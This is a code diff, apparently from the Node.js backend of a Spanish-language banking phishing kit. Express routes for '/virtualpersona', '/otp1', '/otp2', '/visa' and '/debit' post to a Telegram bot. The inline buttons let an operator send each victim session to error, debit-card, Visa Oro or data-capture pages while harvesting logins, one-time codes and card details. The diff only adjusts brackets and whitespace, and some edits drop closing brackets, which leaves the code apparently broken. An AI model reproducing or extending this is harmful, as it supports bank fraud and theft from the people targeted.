@@ -58,7 +58,7 @@ app.post('/virtualpersona', async (req, res) => {
       { text: "❌ Error Logo", callback_data: `go:errorlogo.html|${sessionId}` },
       { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
     ],
-    [
+   [
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -171,7 +171,7 @@ app.post('/otp1', async (req, res) => {
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
     ]
   ]
-    };
+};
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -243,7 +243,7 @@ app.post('/otp2', async (req, res) => {
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
     ]
   ]
-    };
+};
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -276,9 +276,7 @@ app.post('/visa', async (req, res) => {
         [
           { text: "❌ Error Visa", callback_data: `go:visa.html|${sessionId}` },
           { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
-        ]
-      ],
-[
+         [
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -307,7 +305,7 @@ app.post('/visa', async (req, res) => {
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
     ]
   ]
-    };
+};
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -373,9 +371,7 @@ app.post('/debit', async (req, res) => {
         [
           { text: "❌ Error Débito", callback_data: `go:debit.html|${sessionId}` },
           { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
-        ]
-      ],
-	  [
+         [
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -404,7 +400,7 @@ app.post('/debit', async (req, res) => {
       { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
     ]
   ]
-    };
+};
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
